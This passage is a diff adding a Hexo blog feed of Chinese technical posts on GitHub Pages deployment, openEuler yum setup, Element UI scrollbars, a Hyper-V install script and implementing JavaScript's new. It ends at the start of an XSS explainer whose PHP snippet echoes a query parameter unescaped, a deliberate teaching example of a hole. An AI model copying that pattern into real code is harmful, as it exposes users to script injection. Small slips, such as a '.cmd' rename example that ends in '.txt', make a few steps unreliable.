+<figure class="highlight diff"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line">  # URL</span><br><span class="line">  ## Set your site url here. For example, if you use GitHub Page, set url as &#x27;https://username.github.io/project&#x27;</span><br><span class="line"><span class="deletion">- url: http://example.com</span></span><br><span class="line"><span class="addition">+ url: https://username.github.io/ProjectName</span></span><br><span class="line"><span class="addition">+ root: /ProjectName/</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Hexo-命令部署配置"><a href="#Hexo-命令部署配置" class="headerlink" title="Hexo 命令部署配置"></a>Hexo 命令部署配置</h3><ul>
+<li>如果把 <code>https://username.github.io/</code> 作为 Blog 首页地址，则在 Hexo 配置文件设置：</li>
+</ul>
+<figure class="highlight diff"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line">  # Deployment</span><br><span class="line">  ## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="line">  deploy:</span><br><span class="line"><span class="addition">+   type: git</span></span><br><span class="line"><span class="addition">+   repo: git@github.com:username/username.github.io.git</span></span><br><span class="line"><span class="addition">+   branch: gh-pages</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>如果把 <code>https://username.github.io/ProjectName/</code> 作为 Blog 首页地址，则在 Hexo 配置文件设置：</li>
+</ul>
+<figure class="highlight diff"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line">  # Deployment</span><br><span class="line">  ## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="line">  deploy:</span><br><span class="line"><span class="addition">+   type: git</span></span><br><span class="line"><span class="addition">+   repo: git@github.com:username/ProjectName.git</span></span><br><span class="line"><span class="addition">+   branch: gh-pages</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>注意：</strong> 实现 GitHub Pages 部署的原理是，将本地渲染好的静态文件（<code>/public</code> 文件夹内所有文件）以一个单独分支上传到 GitHub 远程仓库，GitHub Pages 服务渲染该分支的静态文件。这里 <code>branch</code> 配置了 GitHub Pages 将要渲染的 <code>gh-pages</code> 分支。</p>
+</blockquote>
+<h3 id="本地-Git-仓库配置与推送"><a href="#本地-Git-仓库配置与推送" class="headerlink" title="本地 Git 仓库配置与推送"></a>本地 Git 仓库配置与推送</h3><p>本步骤的意义在于，切换电脑依然可以写 Blog，不用担心因为本地文件丢失，而无法继续创作。</p>
+<p>在 Blog 站点的根文件夹执行：</p>
+<ul>
+<li>初始化本地 Git 仓库：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>修改分支名称（现在许多仓库分支在去 <code>master</code> 化，如果需要将主分支修改为 <code>main</code> 可以执行下面的命令）：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git checkout -b main</span><br><span class="line">git branch -d master</span><br></pre></td></tr></table></figure>
+
+<p>执行 <code>git branch -a</code> 可以查看目前所有的分支。</p>
+<ul>
+<li>添加远程仓库；</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote add &lt;remoteName&gt; &lt;sshURL&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;remoteName&gt;</code> 是远程仓库名，一般设为<code>origin</code>；<code>sshURL</code> 是远程仓库的 ssh 链接。</p>
+<ul>
+<li>将本地项目分支推送到远程 GitHub 仓库。</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m &quot;hexo init&quot;</span><br><span class="line">git push --set-upstream &lt;remoteName&gt; &lt;branchName&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;remoteName&gt;</code> 是前面设定的远程仓库名；<code>&lt;branchName&gt;</code> 是本地仓库分支名。</p>
+<h3 id="推送静态文件到远程仓库"><a href="#推送静态文件到远程仓库" class="headerlink" title="推送静态文件到远程仓库"></a>推送静态文件到远程仓库</h3><p>在 Blog 根文件夹下执行：</p>
+<ul>
+<li>生成静态文件，并在本地服务器预览：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
+
+<p>在浏览器访问本地服务器地址，查看是否正常，<code>ctrl</code> + <code>C</code> 关闭本地服务器。</p>
+<ul>
+<li>将本地生成的静态文件上传到 GitHub 远程仓库：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure>
+
+<h3 id="启动-GitHub-Pages-服务"><a href="#启动-GitHub-Pages-服务" class="headerlink" title="启动 GitHub Pages 服务"></a>启动 GitHub Pages 服务</h3><p>GitHub 项目主页、Settings -&gt; Pages -&gt; Source：</p>
+<p>选择 <code>gh-pages</code> 作为渲染分支（<code>Branch</code>）；渲染文件夹选择 <code>/(root)</code>；保存（<code>Save</code>）。</p>
+<p>保存后，GitHub 将给出提示：</p>
+<blockquote>
+<p>Your site is published at <a href="https://username.github.io/ProjectName/">https://username.github.io/ProjectName/</a></p>
+</blockquote>
+<p>或者</p>
+<blockquote>
+<p>Your site is published at <a href="https://username.github.io/">https://username.github.io/</a></p>
+</blockquote>
+<p>点击上面的地址，即可访问项目（有时需要等待 15 分钟左右）。</p>
+<h1 id="创建一篇文章"><a href="#创建一篇文章" class="headerlink" title="创建一篇文章"></a>创建一篇文章</h1><p>在 Blog 根文件夹下执行：</p>
+<ul>
+<li>创建文章文件</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>更多请阅读 <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<ul>
+<li>启动本地服务预览</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>更多请阅读 <a href="https://hexo.io/docs/server.html">Server</a></p>
+<ul>
+<li>生成静态文件</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>更多请阅读 <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<ul>
+<li>部署到远程服务器</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>更多请阅读 <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<blockquote>
+<p><strong>参考资料</strong></p>
+<ul>
+<li><a href="https://hexo.io/zh-cn/">Hexo 官网</a></li>
+<li><a href="https://www.jianshu.com/p/ebbbc8edcc24">Git个人博客hexo设置关于、标签、分类、归档、时间线</a></li>
+<li><a href="http://yearito.cn/posts/hexo-theme-beautify.html">Hexo 搭建个人博客系列：主题美化篇</a></li>
+<li><a href="http://yearito.cn/posts/hexo-advanced-settings.html">Hexo 搭建个人博客系列：进阶设置篇</a></li>
+<li><a href="https://www.zhihu.com/question/422584701">知乎 - Hexo Next 主题中文目录点击失效是为什么?</a></li>
+</ul>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Blog 搭建记录</category>
+      </categories>
+      <tags>
+        <tag>GitHub Pages</tag>
+        <tag>Hexo</tag>
+        <tag>NexT</tag>
+        <tag>Git</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>为 openEuler 配置 yum</title>
+    <url>/blog/20210711-configure-yum-for-openeuler/</url>
+    <content><![CDATA[<h1 id="确认发行版"><a href="#确认发行版" class="headerlink" title="确认发行版"></a>确认发行版</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/openEuler-release</span><br></pre></td></tr></table></figure>
+
+<p>显示</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openEuler release 20.03 (LTS)</span><br></pre></td></tr></table></figure>
+
+<h1 id="查询源"><a href="#查询源" class="headerlink" title="查询源"></a>查询源</h1><ul>
+<li>进入华为开源镜像 <a href="https://mirrors.huaweicloud.com/home">https://mirrors.huaweicloud.com/home</a></li>
+<li>选择 “镜像” &gt; “openEuler” &gt; 继续使用</li>
+<li>选择架构（参看系统安装镜像）</li>
+<li>复制命令（以 <code>X86_64</code> 为例）</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/openEulerOS.repo https://repo.huaweicloud.com/repository/conf/openeuler_x86_64.repo</span><br></pre></td></tr></table></figure>
+
+<h1 id="配置-yum"><a href="#配置-yum" class="headerlink" title="配置 yum"></a>配置 yum</h1><p>进入 openEuler：</p>
+<ul>
+<li>下载 <code>openEulerOS.repo</code> 到 <code>/etc/yum.repos.d/</code></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/openEulerOS.repo https://repo.huaweicloud.com/repository/conf/openeuler_x86_64.repo</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>清除原有 yum 缓存</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum clean all</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>生成新的缓存</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum makecache</span><br></pre></td></tr></table></figure>
+
+<h1 id="安装-vim"><a href="#安装-vim" class="headerlink" title="安装 vim"></a>安装 vim</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install vim -y</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>参考资料：</strong></p>
+<ul>
+<li><a href="https://bbs.huaweicloud.com/forum/forum.php?mod=viewthread&tid=98091#lastpost">配置OpenEuler的网络yum源</a></li>
+<li><a href="https://mirrors.huaweicloud.com/home">华为云</a></li>
+</ul>
+</blockquote>
+]]></content>
+      <categories>
+        <category>初学者的 openEuler 之旅</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>openEuler</tag>
+        <tag>yum</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Element UI 的 el-scrollbar（滚动条）组件</title>
+    <url>/blog/20210306-elscrollbar-rolling-strip-components-of-element-ui/</url>
+    <content><![CDATA[<p>Element UI 抽出了滚动条组件——<code>&lt;el-scrollbar&gt;&lt;/el-scrollbar&gt;</code>，但是没有相关文档。官方在 <a href="https://github.com/ElemeFE/element/issues/2238">https://github.com/ElemeFE/element/issues/2238</a> 有过相关回复。这里对该组件的接口总结一下。</p>
+<span id="more"></span>
+
+<p>组件结构如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    ┌──────────┐</span><br><span class="line">┌───┼──────────┼──┬────┬─┐</span><br><span class="line">│   │          │  │    │ │</span><br><span class="line">│   │          │  │    ├─┼────►track</span><br><span class="line">│   │          │  │ ┌┐ │ │</span><br><span class="line">│   │          │  │ ││ │ │</span><br><span class="line">│   │          │  │ │┼─┼─┼────►thumb</span><br><span class="line">│   │          │  │ ││ │ │</span><br><span class="line">│   │          │  │ └┘ │ │</span><br><span class="line">│   │          │  │    │ │</span><br><span class="line">└───┼───┬──────┼──┴────┴─┘</span><br><span class="line">    │   └──────┼─────────────►warp</span><br><span class="line">    │          ├─────────────►view</span><br><span class="line">    └──────────┘</span><br></pre></td></tr></table></figure>
+<p>warp 是可视区域，view 是内容区域，warp 之外的部分将被隐藏。<br>滚动条的滑块 thumb 在 track 区域滑动。</p>
+<p>接口如下：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">props</span>: &#123;</span><br><span class="line">  :<span class="attr">native</span>: <span class="title class_">Boolean</span>,  <span class="comment">// 是否使用本地，设为true则不会启用element-ui自定义的滚动条</span></span><br><span class="line">  <span class="attr">wrapClass</span>: string,  <span class="comment">// 可视区域（warp）自定义样式类</span></span><br><span class="line">  <span class="attr">wrapStyle</span>: string,  <span class="comment">// 可视区域（warp）自定义样式</span></span><br><span class="line">  <span class="attr">viewClass</span>: string,  <span class="comment">// 内容区域自定义样式类</span></span><br><span class="line">  <span class="attr">viewStyle</span>: string,  <span class="comment">// 内容区域自定义样式</span></span><br><span class="line">  <span class="attr">noresize</span>: <span class="title class_">Boolean</span>, <span class="comment">// 如果 container 尺寸不会发生变化，最好设置它可以优化性能</span></span><br><span class="line">  <span class="attr">tag</span>: &#123;  <span class="comment">// 生成的标签类型，默认使用 `div`标签包裹</span></span><br><span class="line">    <span class="attr">type</span>: <span class="title class_">String</span>,</span><br><span class="line">    <span class="attr">default</span>: <span class="string">&#x27;div&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>改变 <code>.el-scrollbar__wrap</code> 这个类的样式一定要仅改变指定想改变的滚动条，避免影响到其他组件中 <code>el-dropdown</code> 有滚动条的样式。</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">// 在 common<span class="selector-class">.css</span> 中添加</span><br><span class="line"><span class="selector-class">.el-scrollbar__wrap</span>&#123;</span><br><span class="line">  <span class="attribute">overflow-x</span>: hidden;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用案例（如果有不需要的接口可以不使用）：<br>在使用时要设置外层容器高度。并且要设置el-scrollbar 的高度为100% 。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;height: 600px;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-scrollbar</span> <span class="attr">style</span>=<span class="string">&quot;height: 100%;&quot;</span> <span class="attr">:native</span>=<span class="string">&quot;false&quot;</span> <span class="attr">wrapStyle</span>=<span class="string">&quot;&quot;</span> <span class="attr">wrapClass</span>=<span class="string">&quot;&quot;</span> <span class="attr">viewClass</span>=<span class="string">&quot;&quot;</span> <span class="attr">viewStyle</span>=<span class="string">&quot;&quot;</span> <span class="attr">:noresize</span>=<span class="string">&quot;false&quot;</span> <span class="attr">tag</span>=<span class="string">&quot;main&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-for</span>=<span class="string">&quot;(item, index) in 200&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span>第 &#123;&#123;index&#125;&#125; 条数据。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-scrollbar</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--或者--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-scrollbar</span> <span class="attr">style</span>=<span class="string">&quot;height: 600px;&quot;</span> <span class="attr">:native</span>=<span class="string">&quot;false&quot;</span> <span class="attr">wrapStyle</span>=<span class="string">&quot;&quot;</span> <span class="attr">wrapClass</span>=<span class="string">&quot;&quot;</span> <span class="attr">viewClass</span>=<span class="string">&quot;&quot;</span> <span class="attr">viewStyle</span>=<span class="string">&quot;&quot;</span> <span class="attr">:noresize</span>=<span class="string">&quot;false&quot;</span> <span class="attr">tag</span>=<span class="string">&quot;main&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-for</span>=<span class="string">&quot;(item, index) in 200&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span>第 &#123;&#123;index&#125;&#125; 条数据。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-scrollbar</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p><strong>参考资料</strong></p>
+<ul>
+<li><a href="https://juejin.cn/post/6844903764873199630">element ScrollBar滚动组件源码深入分析</a></li>
+<li><a href="https://blog.csdn.net/zhouweihua138/article/details/80077311">Element-ui之ElScrollBar组件滚动条的使用</a></li>
+<li><a href="https://juejin.cn/post/6844903793377673230">Element-UI 框架 el-scrollbar 组件</a></li>
+<li><a href="https://www.cnblogs.com/catherLee/p/9554802.html">elementUI中的隐藏组件el-scrollbar</a></li>
+<li><a href="https://segmentfault.com/a/1190000022890903">遮遮掩掩的滚动条 -&gt; el-scrollbar</a></li>
+</ul>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Element UI</category>
+      </categories>
+      <tags>
+        <tag>Element UI</tag>
+        <tag>el-scrollbar</tag>
+        <tag>Element2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/blog/20210728-hello-world/</url>
+    <content><![CDATA[<p>搬新家了，第一篇。</p>
+<span id="more"></span>
+
+<p>之前尝试在不同的平台写项目，现在准备把东西陆续搬到这儿来，做个汇总。</p>
+<p>Happy Coding! Happy Writing!</p>
+]]></content>
+      <categories>
+        <category>站点信息</category>
+      </categories>
+      <tags>
+        <tag>站点信息</tag>
+        <tag>杂谈</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>表单元素作为搜索栏</title>
+    <url>/blog/20220317-form-as-a-search-bar/</url>
+    <content><![CDATA[<p>基于表单元素的特点，可以用其作为搜索栏，而不使用 JavaScript。</p>
+<span id="more"></span>
+
+<p>在 <code>&lt;form&gt;</code> 中，如果有 <code>&lt;button type=&quot;submit&quot;&gt;提交&lt;/ button&gt;</code>，点击可以提交到 <code>&lt;form&gt;</code> 指定的路径。利用这个特点，可以将其做成搜索组件。</p>
+<p>以 <code>/search</code> 为搜索页为例：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/post&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;type&quot;</span> <span class="attr">value</span>=<span class="string">&quot;name&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> /&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--默认带有参数 type=name--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>搜索<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>输入 <code>steven</code>，点击“搜索”后，页面跳转到 <code>/search?type=name&amp;content=steven</code></p>
+<blockquote>
+<hr>
+<ul>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/form">form</a></li>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/button#attr-formaction"><code>&lt;button&gt;</code></a></li>
+</ul>
+</blockquote>
+]]></content>
+      <categories>
+        <category>HTML</category>
+      </categories>
+      <tags>
+        <tag>HTML</tag>
+        <tag>表单</tag>
+        <tag>搜索</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Win11 家庭版安装 Hyper-V 服务</title>
+    <url>/blog/20220907-install-hyper-v-in-the-win-10-family-version/</url>
+    <content><![CDATA[<p>最近正在把旧电脑的环境逐步迁移到新电脑。目前新电脑的操作系统是 Win11 家庭版，Win11 家庭版默认未安装 Hyper-V 服务，需要手动安装并启用。操作步骤如下：</p>
+<span id="more"></span>
+
+<ol>
+<li><p>新建一个文本文件，并将下面代码粘贴到文件内，并保存：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">pushd</span> &quot;%~dp0&quot;</span><br><span class="line"><span class="built_in">dir</span> /b <span class="variable">%SystemRoot%</span>\servicing\Packages\*Hyper-V*.mum &gt;hyper-v.txt</span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;<span class="built_in">findstr</span> /i . hyper-v.txt <span class="number">2</span>^&gt;<span class="built_in">nul</span>&#x27;) <span class="keyword">do</span> dism /online /norestart /add-package:&quot;<span class="variable">%SystemRoot%</span>\servicing\Packages\<span class="variable">%%i</span>&quot;</span><br><span class="line"><span class="built_in">del</span> hyper-v.txt</span><br><span class="line">Dism /online /enable-feature /featurename:Microsoft-Hyper-V-All /Limit</span><br><span class="line">Access /ALL</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>将步骤 1 的文本文件重命名为以 <code>.cmd</code> 为后缀的文件（如 <code>Hyper-V.txt</code>）。</p>
+</li>
+<li><p>以管理员身份运行上述步骤制作的脚本，等待脚本运行结束，未完成前不要关机或重启。</p>
+</li>
+<li><p>脚本运行结束后重启电脑。</p>
+</li>
+<li><p>进入：<code>控制面板</code> -&gt; <code>程序</code> -&gt; <code>程序和功能/启用或关闭 Windows 功能</code>，并勾选 <code>Hyper-V</code>及其下级的 <code>Hyper-V 管理工具</code> 和 <code>Hyper-V 平台</code>，点击 <code>确定</code>，等待系统启用相关服务，按提示点击确认重启电脑。</p>
+</li>
+<li><p>电脑重启完成即完成。</p>
+</li>
+</ol>
+<blockquote>
+<p><strong>参考资料</strong></p>
+<ul>
+<li><a href="https://jingyan.baidu.com/article/d7130635e5678113fcf4757f.html">Windows10 家庭版添加 Hyper-V 的方法</a></li>
+</ul>
+</blockquote>
+]]></content>
+      <categories>
+        <category>环境搭建</category>
+      </categories>
+      <tags>
+        <tag>环境搭建</tag>
+        <tag>Hyper-V</tag>
+        <tag>Win11 家庭版</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>实现 new 关键字</title>
+    <url>/blog/20210729-implement-new/</url>
+    <content><![CDATA[<blockquote>
+<p>之前的笔记，整理一下有关 <code>new</code> 的原理。</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="执行-new-时发生了什么"><a href="#执行-new-时发生了什么" class="headerlink" title="执行 new 时发生了什么"></a>执行 <code>new</code> 时发生了什么</h1><ol>
+<li>创建一个空的 JavaScript 对象（即 <code>&#123;&#125;</code>）；</li>
+<li>将新对象的 <code>__proto__</code> 属性指向构造函数的原型对象（<code>prototype</code>）；</li>
+<li>将步骤 1 新创建的对象作为 <code>this</code> 的上下文，并传入参数 ；</li>
+<li>如果该函数没有返回对象，则返回 <code>this</code>。</li>
+</ol>
+<p>关于上面的第 4 点请看示例一、二：</p>
+<p>示例一：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> a = <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">return</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]; <span class="comment">//返回对象，将 [1,2,3] 替换成其他对象的数据也将返回对象</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_">test</span>();  <span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure>
+
+<p>示例二：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> a = <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">//返回非对象，将 1 替换成其他非对象的数据也是同一结果</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_">test</span>();  <span class="comment">// FireFox: Object&#123;&#125;; Chrom: test&#123;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="实现-new"><a href="#实现-new" class="headerlink" title="实现 new"></a>实现 <code>new</code></h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">newFn</span>(<span class="params">classFn, ...args</span>) &#123;</span><br><span class="line">  <span class="comment">// 创建一个空的 JavaScript 对象</span></span><br><span class="line">  <span class="keyword">const</span> obj = &#123;&#125;;</span><br><span class="line">  <span class="comment">// 将新对象的 __proto__ 属性指向构造函数的原型对象</span></span><br><span class="line">  <span class="title class_">Object</span>.<span class="title function_">setPrototypeOf</span>(obj,classFn.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line">  <span class="comment">// 将步骤1新创建的对象作为 this 的上下文，并传入参数</span></span><br><span class="line">  <span class="keyword">let</span> arg = [...args]; <span class="comment">// 将参数对象转为数组</span></span><br><span class="line">  <span class="keyword">let</span> result = classFn.<span class="title function_">apply</span>(obj, arg);</span><br><span class="line">  <span class="comment">// 如果该函数没有返回对象，则返回 this</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">typeof</span> result === <span class="string">&quot;object&quot;</span> ? result : obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>测试：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用例一：</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> a = <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">return</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]; <span class="comment">//返回对象，将 [1,2,3] 替换成其他对象的数据也将返回对象</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> obj =  <span class="title function_">newFn</span>(test); </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj); <span class="comment">// [1, 2, 3]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 用例二：</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> a = <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">//返回非对象，将 1 替换成其他非对象的数据也是同一结果</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> obj =  <span class="title function_">newFn</span>(test);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj);  <span class="comment">// Object&#123;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 用例三：</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">arg1</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">a</span> = arg1;</span><br><span class="line">&#125;</span><br><span class="line">test.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">say</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">a</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> obj =  <span class="title function_">newFn</span>(test, <span class="number">5</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj); <span class="comment">//Object &#123;a: 5&#125;</span></span><br><span class="line">obj.<span class="title function_">say</span>();  <span class="comment">// 5</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>参考文献：</strong></p>
+<ul>
+<li><a href="https://juejin.cn/post/6950673570196357156">new 到底都做了什么事情</a></li>
+<li><a href="https://www.cnblogs.com/yangrenmu/p/10628244.html">JavaScript 中 new 的用处及其实现</a></li>
+<li>MDN 相关内容</li>
+</ul>
+</blockquote>
+]]></content>
+      <categories>
+        <category>JavaScript 底层原理</category>
+      </categories>
+      <tags>
+        <tag>javaScript</tag>
+        <tag>new</tag>
+        <tag>Object</tag>
+        <tag>对象</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XSS 工作原理</title>
+    <url>/blog/20171217-how-does-xss-work/</url>
+    <content><![CDATA[<blockquote>
+<p><strong>文章原址：</strong> <a href="https://stackoverflow.com/questions/239194/how-does-xss-work">https://stackoverflow.com/questions/239194/how-does-xss-work</a></p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="问题描述："><a href="#问题描述：" class="headerlink" title="问题描述："></a>问题描述：</h1><p>能不能用简单的语言介绍一下 XSS 的工作原理，最好举一个例子，谷歌不能很好的检索这个问题。<br>(Ask by  <strong>Vicky</strong>)</p>
+<h1 id="高赞回答"><a href="#高赞回答" class="headerlink" title="高赞回答"></a>高赞回答</h1><p>当 XSS 存在时，外部应用程序的字符串被解释为代码。<br>如果你的 HTML 是这样的：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">BODY</span>&gt;</span></span><br><span class="line">  &lt;?= $myQueryParameter ?&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">BODY</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
